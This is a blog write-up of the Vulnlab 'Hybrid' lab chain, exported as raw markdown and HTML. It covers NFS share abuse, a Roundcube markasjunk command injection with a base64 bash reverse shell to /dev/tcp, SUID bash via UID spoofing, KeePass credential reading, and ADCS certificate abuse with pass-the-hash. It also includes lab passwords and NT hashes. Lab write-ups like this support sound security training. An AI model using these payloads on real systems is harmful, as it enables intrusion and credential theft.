plaintext. https://github.com/sosdave/KeyTabExtract\n\n![](/images/vulnlab/hybrid-vl/u.png)\n\nWe can now use this NTLM hash to proceed with our certificate request.\n`certipy-ad req -u 'MAIL01$'@hybrid.vl -hashes '0f916c5246fdbc7ba95dcef4126d57bd' -ca 'hybrid-DC01-CA' -template HybridComputers -target hybrid.vl -upn 'administrator@hybrid.vl' -dns dc01.hybrid.vl -key-size 4096 -debug`\n\nOnce again as a reminder, make sure that `dc01.hybrid.vl` and `hybrid.vl` both are set to the IP address of the DC in your `/etc/hosts` file. Just a reminder.\nThis should save a certificate and private key to a file called `administrator_dc01.pfx`. We can use this `.pfx` to now authenticate to the DC and dump the Administrator's NT hash.\n\n`certipy-ad auth -pfx administrator_dc01.pfx -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.238.53`\nThis will dump the NT hash in plaintext, to which we'll use the second part of the hash to authenticate.\n\n![](/images/vulnlab/hybrid-vl/v.png)\n\nLet's test our ability to authenticate to WinRM with these credentials using Pass-the-Hash on CrackMapExec.\n`crackmapexec winrm 10.10.238.53 -u 'Administrator' -H '60701e8543c9f6db1a2af3217386d3dc'`\n\n```\nSMB         10.10.238.53    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)\nHTTP        10.10.238.53    5985   DC01             [*] http://10.10.238.53:5985/wsman\nWINRM       10.10.238.53    5985   DC01             [+] hybrid.vl\\Administrator:60701e8543c9f6db1a2af3217386d3dc (Pwn3d!)\n```\n\nThat `Pwn3d!` notification denotes that we can now access the machine through WinRM.\n`evil-winrm --ip 10.10.238.53 -u 'Administrator' -H '60701e8543c9f6db1a2af3217386d3dc'`\n\n![](/images/vulnlab/hybrid-vl/w.png)\n\nThe root flag is within the Administrator's `Desktop` directory, meaning we now have completed this chain!\n\n# Conclusion\n\nThis machine was an awesome first experience at chains. Given that it was a domain-joined Linux, it required much more research into the attack path as I wasn't very familiar with this type of machine. It was a nice curveball, and the ADCS exploitation made it even more enjoyable. Big thanks goes out to xct for the development of this chain.\n\n# Resources\n\nhttps://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/\nhttps://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\nhttps://github.com/sosdave/KeyTabExtract\n","slug":"hybrid","published":1,"updated":"2024-06-05T20:04:41.989Z","_id":"clx27nekq0000ojufdoj836kf","comments":1,"layout":"post","photos":[],"content":"<p>This chain was relatively fun and allowed me to learn a lot of different tactics that I would’ve previously not known how to do before. It involves attempting to gain initial access to a domain-joined Linux machine, following a pivot to the DC using ADCS.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Running our NMAP scanning to discover both machines <code>10.10.242.85</code> and <code>10.10.242.86</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(daz㉿LAPTOP-VA8M33JK)-[~/tech/vl/hybrid]</span><br><span class=\"line\">└─$ cat initial_scan.txt</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 00:38 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.231.245</span><br><span class=\"line\">Host is up (0.095s latency).</span><br><span class=\"line\">Not shown: 988 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE       VERSION</span><br><span class=\"line\">53/tcp   open  domain        Simple DNS Plus</span><br><span class=\"line\">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-29 04:39:03Z)</span><br><span class=\"line\">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class=\"line\">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class=\"line\">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class=\"line\">| Not valid before: 2023-06-17T14:05:41</span><br><span class=\"line\">|_Not valid after:  2024-06-16T14:05:41</span><br><span class=\"line\">445/tcp  open  microsoft-ds?</span><br><span class=\"line\">464/tcp  open  kpasswd5?</span><br><span class=\"line\">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class=\"line\">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class=\"line\">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class=\"line\">| Not valid before: 2023-06-17T14:05:41</span><br><span class=\"line\">|_Not valid after:  2024-06-16T14:05:41</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class=\"line\">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class=\"line\">| Not valid before: 2023-06-17T14:05:41</span><br><span class=\"line\">|_Not valid after:  2024-06-16T14:05:41</span><br><span class=\"line\">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class=\"line\">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.hybrid.vl</span><br><span class=\"line\">| Not valid before: 2023-06-17T14:05:41</span><br><span class=\"line\">|_Not valid after:  2024-06-16T14:05:41</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class=\"line\">| ssl-cert: Subject: commonName=dc01.hybrid.vl</span><br><span class=\"line\">| Not valid before: 2024-03-28T04:09:07</span><br><span class=\"line\">|_Not valid after:  2024-09-27T04:09:07</span><br><span class=\"line\">| rdp-ntlm-info:</span><br><span class=\"line\">|   Target_Name: HYBRID</span><br><span class=\"line\">|   NetBIOS_Domain_Name: HYBRID</span><br><span class=\"line\">|   NetBIOS_Computer_Name: DC01</span><br><span class=\"line\">|   DNS_Domain_Name: hybrid.vl</span><br><span class=\"line\">|   DNS_Computer_Name: dc01.hybrid.vl</span><br><span class=\"line\">|   Product_Version: 10.0.20348</span><br><span class=\"line\">|_  System_Time: 2024-03-29T04:39:51+00:00</span><br><span class=\"line\">|_ssl-date: 2024-03-29T04:40:31+00:00; 0s from scanner time.</span><br><span class=\"line\">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class=\"line\">Device type: general purpose</span><br><span class=\"line\">Running (JUST GUESSING): Microsoft Windows 2022 (89%)</span><br><span class=\"line\">Aggressive OS guesses: Microsoft Windows Server 2022 (89%)</span><br><span class=\"line\">No exact OS matches for host (test conditions non-ideal).</span><br><span class=\"line\">Network Distance: 2 hops</span><br><span class=\"line\">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">| smb2-time:</span><br><span class=\"line\">|   date: 2024-03-29T04:39:54</span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\">| smb2-security-mode:</span><br><span class=\"line\">|   3:1:1:</span><br><span class=\"line\">|_    Message signing enabled and required</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE (using port 139/tcp)</span><br><span class=\"line\">HOP RTT      ADDRESS</span><br><span class=\"line\">1   94.83 ms 10.8.0.1</span><br><span class=\"line\">2   95.02 ms 10.10.231.245</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 104.10 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 00:40 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.231.246</span><br><span class=\"line\">Host is up (0.094s latency).</span><br><span class=\"line\">Not shown: 990 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE  VERSION</span><br><span class=\"line\">22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class=\"line\">| ssh-hostkey:</span><br><span class=\"line\">|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)</span><br><span class=\"line\">|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)</span><br><span class=\"line\">25/tcp   open  smtp     Postfix smtpd</span><br><span class=\"line\">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class=\"line\">80/tcp   open  http     nginx 1.18.0 (Ubuntu)</span><br><span class=\"line\">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class=\"line\">|_http-title: Redirecting...</span><br><span class=\"line\">110/tcp  open  pop3     Dovecot pop3d</span><br><span class=\"line\">| ssl-cert: Subject: commonName=mail01</span><br><span class=\"line\">| Subject Alternative Name: DNS:mail01</span><br><span class=\"line\">| Not valid before: 2023-06-17T13:20:17</span><br><span class=\"line\">|_Not valid after:  2033-06-14T13:20:17</span><br><span class=\"line\">|_pop3-capabilities: AUTH-RESP-CODE TOP STLS UIDL PIPELINING SASL RESP-CODES CAPA</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">111/tcp  open  rpcbind  2-4 (RPC #100000)</span><br><span class=\"line\">| rpcinfo:</span><br><span class=\"line\">|   program version    port/proto  service</span><br><span class=\"line\">|   100003  3,4         2049/tcp   nfs</span><br><span class=\"line\">|   100003  3,4         2049/tcp6  nfs</span><br><span class=\"line\">|   100005  1,2,3      37551/udp6  mountd</span><br><span class=\"line\">|   100005  1,2,3      49714/udp   mountd</span><br><span class=\"line\">|   100005  1,2,3      50857/tcp6  mountd</span><br><span class=\"line\">|   100005  1,2,3      53003/tcp   mountd</span><br><span class=\"line\">|   100021  1,3,4      34841/tcp   nlockmgr</span><br><span class=\"line\">|   100021  1,3,4      35283/tcp6  nlockmgr</span><br><span class=\"line\">|   100021  1,3,4      37554/udp   nlockmgr</span><br><span class=\"line\">|_  100021  1,3,4      45267/udp6  nlockmgr</span><br><span class=\"line\">143/tcp  open  imap     Dovecot imapd (Ubuntu)</span><br><span class=\"line\">|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS more SASL-IR STARTTLS ID LOGINDISABLEDA0001 have post-login Pre-login ENABLE LITERAL+ listed IDLE OK capabilities</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| ssl-cert: Subject: commonName=mail01</span><br><span class=\"line\">| Subject Alternative Name: DNS:mail01</span><br><span class=\"line\">| Not valid before: 2023-06-17T13:20:17</span><br><span class=\"line\">|_Not valid after:  2033-06-14T13:20:17</span><br><span class=\"line\">587/tcp  open  smtp     Postfix smtpd</span><br><span class=\"line\">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class=\"line\">993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)</span><br><span class=\"line\">| ssl-cert: Subject: commonName=mail01</span><br><span class=\"line\">| Subject Alternative Name: DNS:mail01</span><br><span class=\"line\">| Not valid before: 2023-06-17T13:20:17</span><br><span class=\"line\">|_Not valid after:  2033-06-14T13:20:17</span><br><span class=\"line\">|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS more SASL-IR OK ID Pre-login have post-login ENABLE capabilities LITERAL+ listed IDLE AUTH=LOGINA0001 AUTH=PLAIN</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">995/tcp  open  ssl/pop3 Dovecot pop3d</span><br><span class=\"line\">|_pop3-capabilities: AUTH-RESP-CODE TOP USER UIDL PIPELINING SASL(PLAIN LOGIN) RESP-CODES CAPA</span><br><span class=\"line\">| ssl-cert: Subject: commonName=mail01</span><br><span class=\"line\">| Subject Alternative Name: DNS:mail01</span><br><span class=\"line\">| Not valid before: 2023-06-17T13:20:17</span><br><span class=\"line\">|_Not valid after:  2033-06-14T13:20:17</span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">2049/tcp open  nfs      3-4 (RPC #100003)</span><br><span class=\"line\">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class=\"line\">TCP/IP fingerprint:</span><br><span class=\"line\">OS:SCAN(V=7.94SVN%E=4%D=3/29%OT=22%CT=1%CU=30324%PV=Y%DS=2%DC=T%G=Y%TM=6606</span><br><span class=\"line\">OS:4698%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)</span><br><span class=\"line\">OS:OPS(O1=M4D4ST11NW7%O2=M4D4ST11NW7%O3=M4D4NNT11NW7%O4=M4D4ST11NW7%O5=M4D4</span><br><span class=\"line\">OS:ST11NW7%O6=M4D4ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)</span><br><span class=\"line\">OS:ECN(R=Y%DF=Y%T=40%W=F507%O=M4D4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%</span><br><span class=\"line\">OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T</span><br><span class=\"line\">OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=</span><br><span class=\"line\">OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF</span><br><span class=\"line\">OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40</span><br><span class=\"line\">OS:%CD=S)</span><br><span class=\"line\"></span><br><span class=\"line\">Network Distance: 2 hops</span><br><span class=\"line\">Service Info: Host:  mail01.hybrid.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class=\"line\"></span><br><span class=\"line\">TRACEROUTE (using port 5900/tcp)</span><br><span class=\"line\">HOP RTT      ADDRESS</span><br><span class=\"line\">1   95.17 ms 10.8.0.1</span><br><span class=\"line\">2   95.26 ms 10.10.231.246</span><br><span class=\"line\"></span><br><span class=\"line\">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 87.40 seconds</span><br></pre></td></tr></table></figure>\n\n<p>We can see here that there seems to be a Windows and a Linux machine, which probably hints at the fact that we are going to have to mess around with a domain-joined Linux machine.</p>\n<p>The Windows machine appears to be the DC as the domain name for it is <code>dc01.hybrid.vl</code>, which means we’ll turn our attention to the Linux machine first.</p>\n<p>There seems to be an HTTP web server that is redirecting us somewhere. I also noticed that this machine’s domain name is <code>mail01.hybrid.vl</code>, so we’ll change this in our host file.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/b.jpg\"></p>\n<p>This brings us to a Roundcube email login page, which we’ll probably need to find credentials for.</p>\n<h1 id=\"External-NFS-Mounts\"><a href=\"#External-NFS-Mounts\" class=\"headerlink\" title=\"External NFS Mounts\"></a>External NFS Mounts</h1><p>Before we mess with anything, I want to turn our attention to another potential vulnerable service on the machine - NFS.</p>\n<p>NFS is a file sharing service, much like CIFS(which essentially is SMB). Instead of directly viewing the shares through a command-line interface, we can use NFS to potentially view public shares and mount them to our machine.</p>\n<p>In order to view the different mounts on NFS, we can browse the NFS interface using <code>showmount</code><br><code>showmount -e 10.10.242.86</code></p>\n<p>To which we’ll receive the following output:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Export list for 10.10.242.86:</span><br><span class=\"line\">/opt/share *</span><br></pre></td></tr></table></figure>\n\n<p>This means that we should be able to view all the contents of the <code>/opt/share</code> NFS share by mounting it to our machine.</p>\n<p><code>sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock</code></p>\n<ul>\n<li><code>mount -t nfs</code> to specifically mount an NFS share.</li>\n<li><code>-o vers=3</code> due to our NMAP scan, which denoted the NFS version as 3 or 4.</li>\n<li><code>10.10.231.246:/opt/share /mnt/tmpmnt</code> mounting everything is <code>/opt/share</code> to <code>/mnt/tmpmnt</code>, which is a directory that will be created on our local machine.</li>\n<li><code>-o nolock</code> to disable file-locking, which prevents the execution of binaries on the NFS share.</li>\n</ul>\n<p>Within the contents of <code>/tmp/tmpmnt</code>, we can see a file called <code>backup.tar.gz</code>. We can unzip this with <code>tar</code> - <code>tar -xzf backup.tar.gz</code>. This gives us access to both <code>etc</code> and <code>opt</code> directories in the file archive.</p>\n<p>Upon enumerating the boxes, I’ve found an file that seems to give us credentials to the Roundcube login. This file is <code>/etc/dovecot/dovecot-users</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin@hybrid.vl:&#123;plain&#125;Duckling21</span><br><span class=\"line\">peter.turner@hybrid.vl:&#123;plain&#125;PeterIstToll!</span><br></pre></td></tr></table></figure>\n\n<p>Using these credentials (I’ll use the admin’s credentials), we are able to log in to the Roundcube instance.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/c.png\"></p>\n<h1 id=\"MarkasJunk-RCE\"><a href=\"#MarkasJunk-RCE\" class=\"headerlink\" title=\"MarkasJunk RCE\"></a>MarkasJunk RCE</h1><p>Upon looking around, I’ve stumbled across an email that <code>admin</code> has sent to <code>peter.turner</code>, entailing that they’ll be enabling a Junk plugin on the Roundcube server.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/d.png\"></p>\n<p>Not only that, but it seems we have another user named <code>Ed</code> who we might potentially get access to later. Just something to note down.</p>\n<p>This points us to our attack path to get foothold - RCE.</p>\n<p>Upon doing some research on this junk filter plugin, I found record of a CVE that allows you to get unauthorized remote code execution by configuring the user’s name, sending an email, and then sending the mail to the junk folder. <a href=\"https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/\">https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/</a></p>\n<p>This essentially allows us to trigger an arbitrary command in the user’s name due to a lack of filtering when this version of Roundcube is parsing an email. The article provided above entails the specifics on why this is the case, however it’s really just important to note right now that we can execute commands by adding a <code>&amp;</code> before and after our command in our email name so that Roundcube parses it incorrectly.</p>\n<p>Let’s head over to <code>Compose &gt; Edit Identities</code> (the little pencil icon next to our email) to perform this exploit.</p>\n<p>If we try to add a command regularly as we interpreted above, such as:</p>\n<p><code>admin&amp;curl http://10.8.0.173:9001/&amp;@hybrid.vl</code></p>\n<p>Roundcube will tell us that our email address is invalid. While we could spend more time trying to understand specifically what characters it has on its blacklist, we can instead just push our commands in base64. I also found success in doing this in Burpsuite and URL encoding all special characters. This can be done in Burpsuite by capturing the request and then editing the <code>email</code> value.</p>\n<p>After messing around with a <code>curl</code> test payload, I managed to develop the following:</p>\n<p>The command we are trying to execute is <code>curl http://10.8.0.173</code>, which I’m using to see if we can generate a callback to a simple Python server I’ll stand up on our local machine. This brings us to the example name I’ve constructed below.<br><code>admin&amp;echo$&#123;IFS&#125;Y3VybCBodHRwOi8vMTAuOC4wLjE3Mzo5MDAxLwo=|base64$&#123;IFS&#125;-d|bash&amp;@hybrid.vl</code></p>\n<p>We’ll also want to URL encode any characters so they can bypass any blacklists that Roundcube is attempting to detect on the front-end, and also so that Burpsuite can parse them correctly.<br><code>admin%26echo$&#123;IFS&#125;Y3VybCBodHRwOi8vMTAuOC4wLjE3Mzo5MDAxLwo%3d|base64$&#123;IFS&#125;-d|bash%26%40hybrid.vl</code></p>\n<p><img src=\"/images/vulnlab/hybrid-vl/e.png\"></p>\n<p>Upon submitting the request, we can see that our name is accepted despite having special characters in it.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/f.png\"></p>\n<p>Let’s compose an email now and send it back to ourselves to exploit the plugin. (All I did was compose an email and send it to <code>admin@hybrid.vl</code>).</p>\n<p>Additionally, on my local machine, I’ll start a simple python server on port <code>9001</code> to receive the request. <code>python3 -m http.server 9001</code></p>\n<p><img src=\"/images/vulnlab/hybrid-vl/g.png\"></p>\n<p>We’ll now browse to the email in our inbox after sending it and click the <code>Junk</code> icon on the top of the email.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/i.png\"></p>\n<p>Upon clicking this, we can see that a GET request was sent from <code>10.10.242.86</code> back to our local machine. This means that we can execute commands and get a reverse shell on the target machine.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/j.png\"></p>\n<p>Let’s develop our command that we want to run, in this case I just used <code>Revshells.com</code> to generate a bash one-liner.</p>\n<p>We’ll also combine what we know previously to craft the following payload. Let’s also set up a <code>netcat</code> listener to catch the web request and get us a shell. Command we are trying to run: <code>/bin/bash -i &gt;&amp; /dev/tcp/10.8.0.173/9001 0&gt;&amp;1</code><br><code>admin%26echo$&#123;IFS&#125;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMC4xNzMvOTAwMSAwPiYx|base64$&#123;IFS&#125;-d|bash%26%40hybrid.vl</code></p>\n<p>If we do all of the same steps as outlined previously and use the <code>Junk</code> plugin in a new email, we can see that a reverse shell was spawned as user <code>wwwdata</code>.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/q.png\"></p>\n<h1 id=\"Internal-Mounted-NFS-Exploit\"><a href=\"#Internal-Mounted-NFS-Exploit\" class=\"headerlink\" title=\"Internal Mounted NFS Exploit\"></a>Internal Mounted NFS Exploit</h1><p>Looking around the box initially, there wasn’t anything that I saw that screamed out at me out of the blue. I ended up dropping <code>Linpeas</code> to the box through a Sliver C2 beacon that I created, but didn’t really see anything with it either.</p>\n<p>Upon searching some more, I decided to turn our attention back to NFS to potentially find any vulnerabilities with it. We can find the configurations for NFS in <code>/etc/export</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># /etc/exports: the access control list for filesystems which may be exported</span><br><span class=\"line\">#\t\tto NFS clients.  See exports(5).</span><br><span class=\"line\">#</span><br><span class=\"line\"># Example for NFSv2 and NFSv3:</span><br><span class=\"line\"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span><br><span class=\"line\">#</span><br><span class=\"line\"># Example for NFSv4:</span><br><span class=\"line\"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span><br><span class=\"line\"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span><br><span class=\"line\">#</span><br><span class=\"line\">/opt/share *(rw,no_subtree_check)  </span><br></pre></td></tr></table></figure>\n\n<p>While normally we’d look for NFS privilege escalation vectors such as <code>no_root_squash</code>, we can actually exploit the <code>rw</code> parameter that is set to <code>/opt/share</code>. <a href=\"https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/\">https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/</a></p>\n<p>This next exploit goes into depth on how NFS interprets the <code>rw</code> setting and by also exploiting <code>peter.turner@hybrid.vl</code>‘s UID. If we run a <code>id</code> scan on <code>peter.turner@hybrid.vl</code>, we can see that they have a UID of <code>902601108</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@mail01:~/roundcube$ id peter.turner@hybrid.vl</span><br><span class=\"line\">id peter.turner@hybrid.vl</span><br><span class=\"line\">uid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)</span><br></pre></td></tr></table></figure>\n\n<p>If we create a user with the same UID, we can potentially exploit the <code>/bin/bash</code> binary by setting the sticky bit of <code>bash</code> and running it in the context of <code>peter.turner@hybrid.vl</code>. But how exactly does that make sense? Are we running <code>/bin/bash</code> as <code>peter.turner@hybrid.vl</code>? Yes and no. We’re going to try and run <code>/bin/bash</code> as a user with the SAME UID as <code>peter.turner@hybrid.vl</code>. Meaning, if we create the same user on our local machine and modify the privileges to it using <code>rw</code>, we can run it in the context of <code>peter.turner@hybrid.vl</code>.</p>\n<p>So to do this, we need to do the following:</p>\n<ul>\n<li>Remote Host: <code>cp /bin/bash /opt/share/</code><ul>\n<li>Copying the <code>/bin/bash</code> executable into the NFS share.</li>\n</ul>\n</li>\n<li>Local Host: <code>sudo useradd peter.turner@hybrid.vl -u 902601108</code><ul>\n<li>Creating a user named <code>peter.turner@hybrid.vl</code> with the same UID as the UID on the remote machine.</li>\n<li>NOTE: We will need to edit <code>/etc/login.defs</code> and change <code>UID_MAX</code> to a value greater than <code>902601108</code>.</li>\n</ul>\n</li>\n<li>Local Host: <code>sudo su -l peter.turner@hybrid.vl</code><ul>\n<li>Logging into the new user we created.*</li>\n</ul>\n</li>\n<li>Local Host: <code>sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock</code><ul>\n<li>Mounting the NFS share to <code>/mnt/tmpmnt</code> once more.</li>\n</ul>\n</li>\n<li>Local Host: <code>cp /mnt/tmpmnt/bash /tmp/tmpbash/</code><ul>\n<li>Copying the <code>bash</code> executable to a temporary directory just so we can reset the privileges of the binary&#x2F;</li>\n</ul>\n</li>\n<li>Remote Host: <code>rm /opt/share/bash</code><ul>\n<li>Removing the <code>bash</code> executable from the remote machine so that we can replace it with a newly configured bash executable.</li>\n</ul>\n</li>\n<li>Local Host: <code>cp /tmp/tmpbash/bash /mnt/tmpmnt/</code><ul>\n<li>Copying our executable back into the NFS share.</li>\n</ul>\n</li>\n<li>Local Host: <code>chmod +s /mnt/tmpmnt/bash</code><ul>\n<li>Configuring the sticky bit of the <code>bash</code> executable. By configuring this privilege, it is essentially saying that any user that runs this binary will run it as the context of that user.</li>\n</ul>\n</li>\n<li>Remote Host: <code>/opt/share/bash -p</code><ul>\n<li>We are running the <code>bash</code> binary with <code>-p</code>, which stands for <code>privileged mode</code>. This essentially means that it will set the effective user ID (EUID) to the real user ID. The binary will run with the permissions of the same user who invoked it based on the user ID. (In this case, <code>peter.turner@hybrid.vl</code>)</li>\n</ul>\n</li>\n</ul>\n<p>This should give us a shell as <code>peter.turner@hybrid.vl</code>, as denoted below.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/r.png\"></p>\n<p>The only problem with having this type of shell is that we can’t upgrade our shell in any way at the moment. Any attempt to do so will revert us back to <code>www-data</code>. That being said, I’ll upload a Sliver C2 implant so we can download and upload files whenever we need to.</p>\n<h1 id=\"Reading-KDBX\"><a href=\"#Reading-KDBX\" class=\"headerlink\" title=\"Reading KDBX\"></a>Reading KDBX</h1><p>In the home directory, we can find the first flag to this chain as well as a <code>passwords.kdbx</code> file. We can use <code>kpcli</code> to open this file and read its contents.</p>\n<p>You’ll notice that if you try to show the <code>domain</code> entry, it will be blotted it in red. Copying this to any text file will reveal the real contents. An alternative is to use <code>KeaPassXC</code> if you’re on Windows, though <code>kpcli</code> works fine as well.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kpcli:/&gt; open passwords.kdbx</span><br><span class=\"line\">kpcli:/&gt; ls</span><br><span class=\"line\">=== Groups ===</span><br><span class=\"line\">eMail/</span><br><span class=\"line\">Internet/</span><br><span class=\"line\">hybrid.vl/</span><br><span class=\"line\"></span><br><span class=\"line\">kpcli:/&gt; cd hybrid.vl</span><br><span class=\"line\">kpcli:/&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">=== Entries ===</span><br><span class=\"line\">0. domain                                                                 </span><br><span class=\"line\">1. mail                                                   mail01.hybrid.vl</span><br><span class=\"line\"></span><br><span class=\"line\">kpcli:/&gt; show domain</span><br><span class=\"line\"></span><br><span class=\"line\"> Path: /hybrid.vl/</span><br><span class=\"line\">Title: domain</span><br><span class=\"line\">Uname: peter.turner</span><br><span class=\"line\"> Pass: b0cwR+G4Dzl_rw</span><br><span class=\"line\">  URL: </span><br><span class=\"line\">Notes: </span><br></pre></td></tr></table></figure>\n\n<p>Upon testing these credentials to SSH on the machine, we can see that we have access through SSH as <code>peter.turner@hybrid.vl</code>. Slight note, my IP address did change since I took a break in between doing this.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/s.png\"></p>\n<p>Upon checking for privileges that we can exploit, it seems that this user can run all commands as <code>sudo</code>, which is a nice change of pace for once.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span 